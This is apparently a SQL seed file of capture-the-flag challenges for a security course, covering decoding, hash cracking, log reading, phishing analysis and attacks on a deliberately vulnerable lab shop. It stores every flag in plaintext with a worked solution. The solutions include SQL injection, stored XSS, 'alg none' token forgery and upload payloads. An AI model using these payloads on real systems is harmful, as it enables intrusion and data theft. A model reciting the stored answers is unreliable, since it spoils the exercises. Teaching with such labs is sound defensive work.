insert into ctf_challenges (id, unit, points, title, body, hint, link, flag_hash, flag, solve, sort, builtin, active) values
('cc-base64', 5, 50, 'Not a secret code', 'A developer said this config value was "encrypted". Was it?
```
YWF5YXR7YmFzZTY0X2lzX25vdF9lbmNyeXB0aW9ufQ==
```', 'Ends in == and uses only letters, digits, + and /. That shape has a name.', 'cyberchef/index.html#input=WVdGNVlYUjdZbUZ6WlRZMFgybHpYMjV2ZEY5bGJtTnllWEIwYVc5dWZRPT0', '6d8891e533bcaf7055be49030f535749429bb81dbaff4be4044bb679148f3316', 'aayat{base64_is_not_encryption}', 'CyberChef: From Base64.', 0, true, true),
('cc-layers', 5, 100, 'Layers', 'Malware often hides a string under several encodings. Peel them off one at a time.
```
626d3573626d643759334a796556397961584a6c62463935626d78795a58303d
```', 'Only 0-9 and a-f at first. After that, look at what each step gives you. The last layer shifts every letter by 13.', 'cyberchef/index.html#input=NjI2ZDM1NzM2MjZkNjQzNzU5MzM0YTc5NjU1NjM5Nzk2MTU4NGE2YzYyNDYzOTM1NjI2ZDc4Nzk1YTU4MzAzZA', '0c1cfe3929b3dfda4d4206ead71c2a61eb8c81e812ce44e02af61e9ac82988e3', 'aayat{peel_every_layer}', 'From Hex, then From Base64, then ROT13.', 1, true, true),
('cc-xor', 5, 150, 'One-byte XOR', 'This beacon string was XORed with a single secret byte (hex):
```
3b3b233b2e212235280538282f2e3f053c3528393f052d33342927
```
A one-byte key has only 256 possibilities.', 'CyberChef: From Hex, then XOR Brute Force. Search the results for aayat.', 'cyberchef/index.html#input=M2IzYjIzM2IyZTIxMjIzNTI4MDUzODI4MmYyZTNmMDUzYzM1MjgzOTNmMDUyZDMzMzQyOTI3', '5f3697d1ecdd3a49a53eff6c7f96e44a264a30271b18cf6a76ee11d98e3542c5', 'aayat{xor_brute_force_wins}', 'From Hex, then XOR with key 5A (or XOR Brute Force and filter on ''aayat'').', 2, true, true),
('cc-vigenere', 5, 150, 'Old-school cipher', 'An intercepted note, encrypted with the Vigenère cipher:
```
shgee{nwfa_qlwllz_qzuw_apey_fawpicv}
```
The key is the six-letter word for what a knight raises to block a blow.', 'CyberChef has Vigenère Decode. The key is SHIELD.', 'cyberchef/index.html#input=c2hnZWV7bndmYV9xbHdsbHpfcXp1d19hcGV5X2Zhd3BpY3Z9', '678225ca2c6d353c21bf5adf10e937b2bb8a69625d5cea12ff459849464cb83d', 'aayat{keys_matter_more_than_ciphers}', 'Vigenère Decode with key SHIELD.', 3, true, true),
('cc-crack', 5, 100, 'Crack the leaked hash', 'A leaked database row stores this unsalted SHA-256 password hash:
```
a9c43be948c5cabd56ef2bacffb77cdaa5eec49dd5eb0cc4129cf3eda5f0e74c
```
Try each word from this common-password list:
```
password
sunshine
monkey
football
dragon
letmein
princess
qwerty
shadow
master
```
The flag is aayat{the_password}.', 'Hash each word with SHA2 (256) in CyberChef, or loop over the list with sha256sum in the Linux lab.', 'cyberchef/index.html', '268269be366c06cc992a524a12d7ca491a40058cd423c9e6e1c1e8ae6f12a41f', 'aayat{dragon}', 'sha256(''dragon'') matches. Unsalted, fast hashes of common words fall to a wordlist in seconds.', 4, true, true),
('cc-jwt', 5, 100, 'Read the token', 'This login token came back from a web app. Anyone holding it can read it. Can you?
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQyIiwibmFtZSI6InByaXlhIiwicm9sZSI6InN0dWRlbnQiLCJub3RlIjoiYWF5YXR7and0c19hcmVfc2lnbmVkX25vdF9zZWNyZXR9In0.k3Vn1u0dWQ2vQ6hT9cX8xS1rR0mY7pZ4aB2cD5eF6gH
```', 'Three parts separated by dots. CyberChef: JWT Decode.', 'cyberchef/index.html#input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnpkV0lpT2lJeE1EUXlJaXdpYm1GdFpTSTZJbkJ5YVhsaElpd2ljbTlzWlNJNkluTjBkV1JsYm5RaUxDSnViM1JsSWpvaVlXRjVZWFI3YW5kMGMxOWhjbVZmYzJsbmJtVmtYMjV2ZEY5elpXTnlaWFI5SW4wLmszVm4xdTBkV1EydlE2aFQ5Y1g4eFMxclIwbVk3cFo0YUIyY0Q1ZUY2Z0g', '0d7f901b3cecb3bcda7b99e76b92479103b715e78098c5ea10262b4c2dbca7cf', 'aayat{jwts_are_signed_not_secret}', 'JWT Decode (or From Base64 on the middle part). A signature stops changes, but it doesn''t hide the payload.', 5, true, true),
('net-basic', 3, 100, 'Café Wi-Fi capture', 'On open café Wi-Fi you captured this plain-HTTP request:
```
GET /portal HTTP/1.1
Host: intranet.example.com
Authorization: Basic cHJpeWE6YWF5YXR7aHR0cF9iYXNpY19pc19qdXN0X2Jhc2U2NH0=
User-Agent: Mozilla/5.0
```
The flag is the password.', 'The Basic scheme is just base64 of user:password.', 'cyberchef/index.html#input=Y0hKcGVXRTZZV0Y1WVhSN2FIUjBjRjlpWVhOcFkxOXBjMTlxZFhOMFgySmhjMlUyTkgwPQ', '12ff3e5a116ff97f8c7951cdb3675d169a6666af814f153f3381446022ef9b1b', 'aayat{http_basic_is_just_base64}', 'Base64-decode the header: priya:aayat{...}. Without HTTPS, anyone on the network can read it.', 6, true, true),
('net-scan', 3, 100, 'Who is scanning us?', 'Firewall log from this morning. One source is probing many different ports, the signature of a port scan.
```
Nov 03 10:05:00 fw01 DROP IN=eth0 SRC=198.51.100.20 DST=10.0.0.5 PROTO=TCP DPT=443 SYN
Nov 03 10:05:01 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=21 SYN
Nov 03 10:05:02 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=22 SYN
Nov 03 10:05:03 fw01 DROP IN=eth0 SRC=198.51.100.20 DST=10.0.0.5 PROTO=TCP DPT=443 SYN
Nov 03 10:05:04 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=23 SYN
Nov 03 10:05:05 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=25 SYN
Nov 03 10:05:06 fw01 DROP IN=eth0 SRC=192.0.2.44 DST=10.0.0.5 PROTO=TCP DPT=22 SYN
Nov 03 10:05:07 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=53 SYN
Nov 03 10:05:08 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=80 SYN
Nov 03 10:05:09 fw01 DROP IN=eth0 SRC=192.0.2.44 DST=10.0.0.5 PROTO=TCP DPT=22 SYN
Nov 03 10:05:10 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=110 SYN
Nov 03 10:05:11 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=135 SYN
Nov 03 10:05:12 fw01 DROP IN=eth0 SRC=192.0.2.44 DST=10.0.0.5 PROTO=TCP DPT=22 SYN
Nov 03 10:05:13 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=139 SYN
Nov 03 10:05:14 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=143 SYN
Nov 03 10:05:15 fw01 DROP IN=eth0 SRC=198.51.100.31 DST=10.0.0.5 PROTO=TCP DPT=80 SYN
Nov 03 10:05:16 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=443 SYN
Nov 03 10:05:17 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=445 SYN
Nov 03 10:05:18 fw01 DROP IN=eth0 SRC=198.51.100.20 DST=10.0.0.5 PROTO=TCP DPT=443 SYN
Nov 03 10:05:19 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=993 SYN
Nov 03 10:05:20 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=1433 SYN
Nov 03 10:05:21 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=3306 SYN
Nov 03 10:05:22 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=3389 SYN
Nov 03 10:05:23 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=5900 SYN
Nov 03 10:05:24 fw01 DROP IN=eth0 SRC=203.0.113.66 DST=10.0.0.5 PROTO=TCP DPT=8080 SYN
```
The flag is the scanner''s address: aayat{a.b.c.d}', 'Count how many different DPT values each SRC tries. Lots of failed SSH tries is brute force, not a scan.', '', 'de835dfa423dc27c2db66a87259bfe6bf628f6d8a91867753709cb43089eb029', 'aayat{203.0.113.66}', '203.0.113.66 hits 18 different destination ports in 18 seconds. 192.0.2.44 only retries port 22, which is brute force.', 7, true, true),
('se-link', 1, 50, 'Where does this link really go?', 'A text message says your bank account is locked and links to:
```
https://secure.mybank.com.account-verify.xyz/login?session=8812
```
Which registered domain will your browser actually contact? Flag: aayat{domain}', 'Read the hostname right to left. The registered domain is the part just before the top-level domain.', '', '80148316f8c4cf4877070b3148b170fceafdee74544fc6d0380a39d2891eb5e7', 'aayat{account-verify.xyz}', 'The hostname ends in account-verify.xyz. Everything before that is a subdomain the attacker controls.', 8, true, true),
('se-headers', 1, 100, 'Read the email headers', 'The display name says PayPal. The headers tell a different story:
```
From: "PayPal Service" <service@paypal.com>
Reply-To: billing@paypa1-support.top
Return-Path: <bounce@paypa1-support.top>
Received: from mail.paypa1-support.top (45.13.0.9)
Authentication-Results: spf=fail smtp.mailfrom=paypa1-support.top; dkim=none
Subject: Your account has been limited
```
Which domain really sent it? Flag: aayat{domain}', 'Look at Return-Path and the SPF result, not the From line.', '', 'd4c99904a36da49770e666f726f2b7f34685fb02e3e0f9b1c065d1e04da76755', 'aayat{paypa1-support.top}', 'Return-Path and Received both show paypa1-support.top (a digit 1, not an l), and SPF fails for it.', 9, true, true),
('phys-badge', 2, 100, 'A cloned badge', 'Badge reader log for one building. One badge is in two places at once, so somebody cloned it.
```
07:58:02 B-1180 Main lobby
07:59:40 B-4471 Main lobby
08:01:13 B-2093 Main lobby
08:03:55 B-1180 Lab 2
08:04:10 B-4471 Server room
08:04:12 B-4471 Loading dock
08:06:31 B-2093 Office 3
08:09:02 B-3307 Main lobby
08:12:45 B-3307 Office 1
```
Flag: aayat{badge id}', 'The server room and the loading dock are at opposite ends of the building.', '', '830c535d293170dd92d577af9a845b66e42aab29f51e518d50c8f2f21f1a52e1', 'aayat{B-4471}', 'B-4471 swipes the server room and the loading dock two seconds apart. That''s impossible for one person, so the badge was cloned.', 10, true, true),
('lx-crack', 4, 100, 'Linux lab: crack it', 'Open the Linux lab, press Start and then Create the lab files. ~/lab/leaked_hash.txt is a SHA-256 of a password from ~/lab/wordlist.txt. The flag is aayat{password}.', 'Lab card 4 has a loop that hashes every word.', 'linux.html', 'f1d8c35369211cb1562200aa51454e785385ea183ddc34e89ed9f4b2dac9fc3b', 'aayat{letmein}', 'for w in $(cat wordlist.txt); do ... sha256sum ... done finds letmein.', 11, true, true),
('lx-key', 4, 100, 'Linux lab: who got in with a key?', 'In the Linux lab, ~/lab/auth.log records SSH logins. One account signed in with a public key instead of a password. The flag is aayat{username}.', 'grep Accepted auth.log', 'linux.html', '8751a17da1457ea1d8b7711f56aa899e6423fcb116ef28a727cb23919bf1989a', 'aayat{deploy}', 'grep Accepted auth.log shows ''Accepted publickey for deploy''.', 12, true, true),
('sqli-login', 5, 100, 'SQL injection: walk in as admin', 'Log in to the staff portal as admin without knowing the password. Open the SQL injection lab; the flag appears when you succeed.', 'Close the quote, add a condition that is always true, then comment out the rest.', 'sqli.html', '69e2533792961ac840e8d26d20492c35b08799b4220042b28f45ea9c334e6d88', 'aayat{or_1_equals_1_opens_doors}', 'Username: admin'' -- (or '' OR 1=1 --). The password check is commented out.', 13, true, true),
('sqli-hidden', 5, 150, 'SQL injection: hidden stock', 'The product search only shows products where hidden = 0. Make it list the hidden ones too. Open the SQL injection lab; the flag appears when you succeed.', 'Your text lands inside LIKE ''%...%''. Close it, then OR in a condition about hidden.', 'sqli.html', '40f3cebfcd0e4924216ea356754ad6e9a0ab7a6f0e83f9ab824e20cd57aee7f0', 'aayat{hidden_is_not_secure}', 'Search: %'' OR hidden = 1 --', 14, true, true),
('sqli-union', 5, 200, 'SQL injection: UNION heist', 'There is a table called secrets. Pull its contents into the product search results. Open the SQL injection lab; the flag appears when you succeed.', 'UNION SELECT needs the same number of columns as the original query: two.', 'sqli.html', '6bc6296a20248d65dbf3e957ccf06723b6aa11cfb671287deb3c1906b0b5518c', 'aayat{union_select_everything}', 'Search: '' UNION SELECT note, 0 FROM secrets --', 15, true, true),
('sqli-fix', 5, 200, 'SQL injection: fix it', 'Rewrite the login query with ? placeholders so all the attacks fail and real logins still work. Open the SQL injection lab; the flag appears when you succeed.', 'Keep the query, but replace each quoted value with a bare ?.', 'sqli.html', '60ca664c8125b4733c8a13bd5e0edb062b6c50b577e129c2b8d10d67d44fc2a1', 'aayat{parameters_beat_injection}', 'SELECT id, username, role FROM users WHERE username = ? AND password = ?', 16, true, true),
('shop-error', 5, 50, 'Shop: leaky errors', 'Make the shop show you a raw database error. Open the vulnerable shop; the flag appears when you succeed.', 'What does a search for a single quote do?', 'shop.html', '0f9335897da5a2fef62374392cb8a5dde10b4835f150229229cabcab826719a3', 'aayat{errors_tell_attackers_too_much}', 'Search for '' and the API returns the SQL error with the full query.', 17, true, true),
('shop-sqli', 5, 150, 'Shop: log in as the admin', 'Log in as admin@nimbu.shop without the password. Open the vulnerable shop; the flag appears when you succeed.', 'The email field goes straight into SQL.', 'shop.html', '41698925491d781b77e275f410111ce90f7c15c8527d750b98094b8934a3acca', 'aayat{sqli_login_as_admin}', 'Email: admin@nimbu.shop'' -- with any password.', 18, true, true),
('shop-admin', 5, 100, 'Shop: the page nobody links to', 'Find and open the shop''s administration page. Open the vulnerable shop; the flag appears when you succeed.', 'Look through the shop''s JavaScript in the Sources tab for route names. You''ll need an admin session.', 'shop.html', 'e78aee6ca402e9813d0e83bf8f452b8f4fdb112487fddde362b050dcbdd4b071', 'aayat{hidden_routes_are_not_access_control}', 'Sources lists #/administration. Open it while logged in as admin.', 19, true, true),
('shop-idor', 5, 150, 'Shop: other people''s orders', 'Read an order that belongs to somebody else. Open the vulnerable shop; the flag appears when you succeed.', 'Open one of your orders and watch the API call in the Network tab. What if you change the number?', 'shop.html', 'd3f958367bea56a217039715cfe3dc2b5560d0a2550855cb0f70c8897337625c', 'aayat{check_who_owns_the_object}', 'GET /api/orders/1 works for any logged-in user. The server never checks the owner.', 20, true, true),
('shop-backup', 5, 100, 'Shop: forgotten backup', 'Find a backup file the developers forgot to remove. Open the vulnerable shop; the flag appears when you succeed.', 'Every site has a file that tells search engines where not to look.', 'shop.html', '2db8178dc3b9844ea896074922b63a01672e07c9143f4c2841bd79ece49bcf98', 'aayat{robots_txt_is_a_map}', '/robots.txt disallows /ftp; /ftp lists backup-2026.bak, and the flag is inside it.', 21, true, true),
('shop-xss', 5, 200, 'Shop: stored XSS', 'Post a product review that makes the page pop up an alert box for everyone who views it. Open the vulnerable shop; the flag appears when you succeed.', 'Reviews are inserted as HTML. A <script> tag or an <img onerror=...> works.', 'shop.html', 'e693a62dd6a8de0e6cd0ebf8f64a533e0c09e6496ccf99bcb5bcf4577d7ef869', 'aayat{never_trust_user_html}', 'Review text: <img src=x onerror=alert(1)>', 22, true, true),
('shop-negative', 5, 150, 'Shop: they pay you', 'Check out with a basket total below zero. Open the vulnerable shop; the flag appears when you succeed.', 'The page won''t let you type a negative quantity, but the API is a different story. Use Edit and resend.', 'shop.html', '5a070b0f673cfaad9aca0cb8821ae4357101a979ef9d6be28ed0d92068b7f2e8', 'aayat{validate_on_the_server}', 'Resend POST /api/basket with "qty": -10, then check out.', 23, true, true),
('shop-feedback', 5, 100, 'Shop: zero stars', 'Send feedback with a rating of 0. The form only lets you choose 1 to 5. Open the vulnerable shop; the flag appears when you succeed.', 'The limit only exists in the browser. Resend the request with your own value.', 'shop.html', '1b8e918bf22efe30f212a99c0b9c0d3d5212525581fe8ca964584dbf4c6314c6', 'aayat{client_checks_are_suggestions}', 'Resend POST /api/feedback with "rating": 0.', 24, true, true),
('shop-reset', 5, 150, 'Shop: reset Jim''s password', 'Reset the password for jim@nimbu.shop using his security question. Open the vulnerable shop; the flag appears when you succeed.', 'His question asks for his pet''s name. Jim talks a lot in product reviews.', 'shop.html', '4271f91881b94a78113f4ac00d8f6b73ff52eef6c72e37a2fc9800a34e9ae642', 'aayat{security_questions_are_public}', 'Jim''s review of the cat-ear headset mentions his dog Bruno. Answer: Bruno.', 25, true, true),
('shop-jwt', 5, 250, 'Shop: forge a token', 'Without the admin password, make the API accept you as admin by editing your token. Open the vulnerable shop; the flag appears when you succeed.', 'Decode your token in the Storage tab. What happens if alg says none and you drop the signature?', 'shop.html', 'd6ff39a4110d9fbe470704b5eb13f7f3b9d2c8492ec080f2b3f802b85543850e', 'aayat{alg_none_is_no_security}', 'Set header {"alg":"none"}, payload role admin, keep the trailing dot with no signature, save it and open the admin page.', 26, true, true),
('rb-phish', 1, 200, 'The invoice that wasn''t', 'Work the Kestrel Logistics ransomware runbook. The loader left a settings file behind, and its campaign value is encoded. Decode it.
', 'Step 7 of the runbook. The value after campaign= is base64: try base64 -d.', 'notebook.html#nb-cases-h', 'eb23246d335be9e913bf1a5aec0249787903d7d2a9af88f292a0070b0483f8d8', 'aayat{decode_the_dropper_config}', 'grep ''^campaign='' suspect/upd.cfg | cut -d= -f2- | base64 -d', 50, true, true),
('rb-insider', 2, 150, 'The night shift download', 'Work the Halcyon insider runbook. Something plugged into eng-ws57 at 02:05 had a very unusual name.
', 'Read usb.log, or build the timeline in step 7.', 'notebook.html#nb-cases-h', 'f1f2b051ef53ed0663016f48fb4d2dc03313732bb15860ae29c7cc26ead352b4', 'aayat{timeline_tells_the_story}', 'The USB volume label in usb.log.', 50, true, true),
('rb-web01', 3, 200, 'Follow the beacon home', 'Work the NimbuMart web server runbook. The attacker kept notes on their own staging server. What tag did they sign with?
', 'Step 7: nmap the attacker''s address, then curl the web server you find on it.', 'notebook.html#nb-cases-h', '3ea4f33fd00965f42a763a39d91ba451d40bc652cd80de412bd86b0663964da5', 'aayat{follow_the_beacon_home}', 'curl -s http://203.0.113.7:8080/notes.txt', 50, true, true),
('rb-cloudkey', 5, 200, 'The key in the commit', 'Work the Paperplane cloud key runbook. The secret was deleted from the repo the next day. Deleted is not the same as gone.
', 'Step 3: read the whole Git history, including what the delete commit removed.', 'notebook.html#nb-cases-h', 'e2317ed149a6eeb75a6231e4c427eeabb15a1ea9b9f4e978d03f0e93a19ae7cc', 'aayat{history_never_forgets}', 'The comment line in config/staging.env in repo_history.txt.', 50, true, true),
('rb-ddos', 3, 150, 'Exam day outage', 'Work the Northfield exam outage runbook. The HTTP flood signs every request with the same user agent. Read it closely.
', 'Step 4: count the user agents in access.log, or read the http.user_agent field in the capture.', 'notebook.html#nb-cases-h', '3bdf06b4ea99f791c1e9529d469876dfc70ee7919c6f6e367212b151e9f74350', 'aayat{rate_limit_the_flood}', 'The user agent of the GET /login?ts= flood.', 50, true, true),
('sqli-schema', 5, 150, 'The table nobody mentioned', 'The Northwind staff portal has a table it never shows. Find it and read it.
', 'sqlite_master lists every table. Use UNION in the product search.', 'sqli.html', 'bf5ac751d238ada6d1f14b06a6b69d81eee8c3c232f45e55ffe96efc06bbbc4a', 'aayat{sqlite_master_knows_all}', ''' UNION SELECT name, 1 FROM sqlite_master -- then '' UNION SELECT note, 1 FROM hr_bonus_2026 --', 65, true, true),
('sqli-blind', 5, 250, 'Yes or no', 'The username checker only answers taken or free. That is enough to read admin''s PIN.
', 'admin'' AND substr(pin,1,1)=''4'' -- is taken only when the guess is right.', 'sqli.html', '581f1fc05bdf36beb2b5e10e689f88b079e22a0f3105e31699a4531e9313371c', 'aayat{one_bit_at_a_time}', 'Boolean blind SQL injection on the username checker, one digit at a time.', 66, true, true),
('shop-coupon', 5, 150, 'Coupon twice', 'WELCOME10 is meant to work once per customer.
', 'The shop remembers the code exactly as typed, but accepts it in any case.', 'shop.html', '93f484bde02b81f11c9c85fa8543f602a1d9879ffc107eea309394521f82d837', 'aayat{normalise_before_you_compare}', 'Apply WELCOME10, then welcome10.', 75, true, true),
('shop-redirect', 5, 100, 'Open redirect', 'Make a nimbu.shop link that sends people anywhere you like.
', 'Look for /go?to= in Sources.', 'shop.html', '8c354a50db7a0549a0af61e799074ba80106a6a7826e3dabcadd6ece26cfbb8a', 'aayat{check_where_links_go}', '/go?to=https://example.com', 76, true, true),
('shop-upload', 5, 200, 'Not a picture', 'Upload a profile picture that runs JavaScript.
', 'The check only looks for .png somewhere in the name.', 'shop.html', 'a1fc6aab9eadb3cc30cf4836f558e3de6f5100883773b0adb5eeec81e4753428', 'aayat{check_the_real_file_type}', 'Upload me.png.html containing <img src=x onerror=alert(1)>, then open /uploads/me.png.html.', 77, true, true),
('se-homoglyph', 1, 100, 'Look-alike letters', 'This sign-in link looks right, but one letter is not what it seems:
```
https://аpple-id.example/verify
```
Which alphabet does the first letter of the domain come from? The flag is aayat{ALPHABET_a} in lowercase, for example aayat{greek_a}.
', 'Paste it into CyberChef and use To Hex. A normal a is 61. Look up the bytes you get.', 'cyberchef/index.html#input=aHR0cHM6Ly/QsHBwbGUtaWQuZXhhbXBsZS92ZXJpZnk', 'e23e99220bfa0004d640c12d687eb8c22c372861a15923e0ad8b1083042b7ec2', 'aayat{cyrillic_a}', 'To Hex shows d0 b0: Cyrillic small letter a (U+0430).', 60, true, true),
('se-shortlink', 1, 100, 'Where does the short link go?', 'A text message said your parcel is stuck and gave a short link. Someone saved what the link did, but encoded it:
```
R0VUIGh0dHBzOi8vc2hvLnJ0L3g3USAtPiAzMDEgaHR0cHM6Ly90cmFjay5wYXJjZWwtaGVscC5leGFtcGxlL3I/aWQ9ODgKR0VUIGh0dHBzOi8vdHJhY2sucGFyY2VsLWhlbHAuZXhhbXBsZS9yP2lkPTg4IC0+IDMwMiBodHRwczovL3BhcmNlbC1oZWxwLmV4YW1wbGUvcGF5LnBocApwYWdlIHRpdGxlOiBQYXkgdGhlIHJlZGVsaXZlcnkgZmVlIChhYXlhdHtleHBhbmRfYmVmb3JlX3lvdV9jbGlja30p
```
', 'From Base64 in CyberChef. Follow each hop to the last page.', 'cyberchef/index.html#input=UjBWVUlHaDBkSEJ6T2k4dmMyaHZMbkowTDNnM1VTQXRQaUF6TURFZ2FIUjBjSE02THk5MGNtRmpheTV3WVhKalpXd3RhR1ZzY0M1bGVHRnRjR3hsTDNJL2FXUTlPRGdLUjBWVUlHaDBkSEJ6T2k4dmRISmhZMnN1Y0dGeVkyVnNMV2hsYkhBdVpYaGhiWEJzWlM5eVAybGtQVGc0SUMwK0lETXdNaUJvZEhSd2N6b3ZMM0JoY21ObGJDMW9aV3h3TG1WNFlXMXdiR1V2Y0dGNUxuQm9jQXB3WVdkbElIUnBkR3hsT2lCUVlYa2dkR2hsSUhKbFpHVnNhWFpsY25rZ1ptVmxJQ2hoWVhsaGRIdGxlSEJoYm1SZlltVm1iM0psWDNsdmRWOWpiR2xqYTMwcA', 'c38393e08310561d74213a9eab440bd71be7838d49a2fa4f357e7fe11c18bdfa', 'aayat{expand_before_you_click}', 'From Base64; the last line holds the flag.', 61, true, true),
('phys-badge-hex', 2, 100, 'Cloned badge', 'A cheap reader copied this from an access badge. Badges are only data.
```
4B 45 53 54 52 45 4C 2D 42 41 44 47 45 7C 75 69 64 3D 30 34 3A 41 37 3A 31 31 3A 42 32 7C 61 61 79 61 74 7B 62 61 64 67 65 73 5F 61 72 65 5F 6A 75 73 74 5F 62 79 74 65 73 7D
```
', 'From Hex in CyberChef.', 'cyberchef/index.html#input=NEIgNDUgNTMgNTQgNTIgNDUgNEMgMkQgNDIgNDEgNDQgNDcgNDUgN0MgNzUgNjkgNjQgM0QgMzAgMzQgM0EgNDEgMzcgM0EgMzEgMzEgM0EgNDIgMzIgN0MgNjEgNjEgNzkgNjEgNzQgN0IgNjIgNjEgNjQgNjcgNjUgNzMgNUYgNjEgNzIgNjUgNUYgNkEgNzUgNzMgNzQgNUYgNjIgNzkgNzQgNjUgNzMgN0Q', '0d933a62671072a5dc50578c573ea9d32e4387c75c37632ae87543313bd9f2cf', 'aayat{badges_are_just_bytes}', 'From Hex.', 60, true, true),
('phys-insider-usb', 2, 100, 'Serial number', 'In the Halcyon insider runbook, what was the serial number of the USB drive? The flag is aayat{SERIAL}.
', 'usb.log, the device connected line.', 'notebook.html#nb-cases-h', '482541f7acb4b36c503bee437d27ad203b22626ee7d37bd7787317cf922d8dcf', 'aayat{4C530001230918112345}', 'grep serial usb.log', 61, true, true),
('net-backdoor-port', 3, 100, 'The port nobody opened', 'In the hacked web shop runbook, a full port scan of web01 finds one port that shouldn''t be there. The flag is aayat{PORT}.
', 'nmap -p- 10.0.0.5', 'notebook.html#nb-cases-h', '3c5da0e3c5ba543f8633c532cf2d536b552770d3856291ca31bcbb1242a57952', 'aayat{31337}', 'nmap -sV -p- 10.0.0.5', 60, true, true),
('net-dns-before', 3, 150, 'Name before the download', 'In the Kestrel ransomware runbook, which domain did hr-pc07 look up just before it downloaded the second stage? The flag is aayat{DOMAIN}.
', 'tshark -r capture.pcap -Y dns', 'notebook.html#nb-cases-h', '6b0e77aa05f6ea3849c825d984ab5134a1237ba2c356ae9610a565388d717258', 'aayat{cdn-update-check.net}', 'tshark -r capture.pcap -Y dns -T fields -e ip.src -e dns.qry.name', 61, true, true),
('lx-octal', 4, 50, 'Three digits', 'A script must be readable, writable and runnable by its owner, readable and runnable by its group, and nothing at all for anyone else. Which chmod number? The flag is aayat{NUMBER}.
', 'r=4, w=2, x=1. Add them for owner, group, others. Try it with chmod and ls -l in the Linux lab.', 'linux.html', '15685696ef1e86f09c57de66b8612285b8f9656f3f2f5c4869dfb8705e1fb30b', 'aayat{750}', '7 (rwx) 5 (r-x) 0 (---)', 60, true, true),
('lx-md5-wordlist', 4, 150, 'Weak hash, short list', 'A password database leaked this MD5 hash:
```
d8578edf8458ce06fbc5bb76a58c5ca4
```
The password is in ~/lab/wordlist.txt in the Linux lab. The flag is aayat{PASSWORD}.
', 'Press Create the lab files, then loop over the wordlist with md5sum, like step 4 does with sha256sum.', 'linux.html', '9b10380730e7344ffcfe4f2d4541a7ca0ea9989f6ef582837f2dc63513de096c', 'aayat{qwerty}', 'for w in $(cat wordlist.txt); do echo -n $w | md5sum | grep -q d8578edf8458ce06fbc5bb76a58c5ca4 && echo $w; done', 61, true, true),
('app-urldecode', 5, 100, 'Encoded attack', 'This line came from a web server log. The attacker''s input is hidden behind %-codes.
```
203.0.113.7 - - [03/Nov/2026:09:08:44 +0000] "GET /shop?id=12%20UNION%20SELECT%20%27aayat%7Burl%5Fdecode%5Fthe%5Fattack%7D%27%2C1%20FROM%20users%2D%2D HTTP/1.1" 200 3301 "-" "sqlmap/1.8"
```
', 'CyberChef: URL Decode. Then read what the attacker tried to select.', 'cyberchef/index.html#input=MjAzLjAuMTEzLjcgLSAtIFswMy9Ob3YvMjAyNjowOTowODo0NCArMDAwMF0gIkdFVCAvc2hvcD9pZD0xMiUyMFVOSU9OJTIwU0VMRUNUJTIwJTI3YWF5YXQlN0J1cmwlNUZkZWNvZGUlNUZ0aGUlNUZhdHRhY2slN0QlMjclMkMxJTIwRlJPTSUyMHVzZXJzJTJEJTJEIEhUVFAvMS4xIiAyMDAgMzMwMSAiLSIgInNxbG1hcC8xLjgi', 'db02ff1749cb5198d69811736b638e6f97c924852b630c02af0fa36cf267e113', 'aayat{url_decode_the_attack}', 'URL Decode shows UNION SELECT ''aayat{url_decode_the_attack}'',1 FROM users--', 60, true, true),
('app-cloud-user', 5, 100, 'The backdoor account', 'In the Paperplane cloud key runbook, what is the name of the user the attacker created? The flag is aayat{USERNAME}.
', 'Look for CreateUser in audit.json.', 'notebook.html#nb-cases-h', '834c4814c35d5caa3e0401e5027af0022676eb3a11aac1bdaf108f4e78bfff07', 'aayat{support-backup}', 'grep CreateUser -A2 audit.json', 62, true, true),
('f-phish-eml', 1, 200, 'The invoice email', 'The finance office forwarded a suspicious email as a raw .eml file. The From line says Dropbox. Prove it isn''t.

Open invoice.eml in a text editor (not a mail app). Find the domain that really sent it, and the IP address of the first mail server outside the school that handed it over.

Flag: aayat{domain_ip}, for example aayat{bad.example_192.0.2.1}

Files: assets/ctf-files/f-phish-eml/invoice.eml', 'Received headers are added top-down by each server, so read them bottom-up. The school''s own servers are 10.x addresses with kestrel-school in the name. DKIM d= and SPF smtp.mailfrom name the real sender.', 'cyberchef/index.html', 'a4afab9f95f41f2aa054d776a0841afac1772888fd5d76d9693fa665314557bc', 'aayat{dr0pbox-files.example_198.51.100.73}', 'DKIM d=dr0pbox-files.example passes and SPF passes for mailer.dr0pbox-files.example, while DMARC fails for dropbox.com: the real sender is dr0pbox-files.example. The Received line added by mx1.kestrel-school.example says it came from smtp-out.dr0pbox-files.example (198.51.100.73); the line below that is inside the sender''s network. The base64 bodies decode to a link to www.dropbox.com.view.dr0pbox-files.example.', 100, true, true),
('f-pw-entropy', 1, 100, 'How many bits?', 'Read policy.txt. For each policy, work out the entropy in bits of a randomly chosen password: bits = length x log2(number of choices per position).

Round each to the nearest whole number. Flag: aayat{A_B_C}, for example aayat{10_20_30}

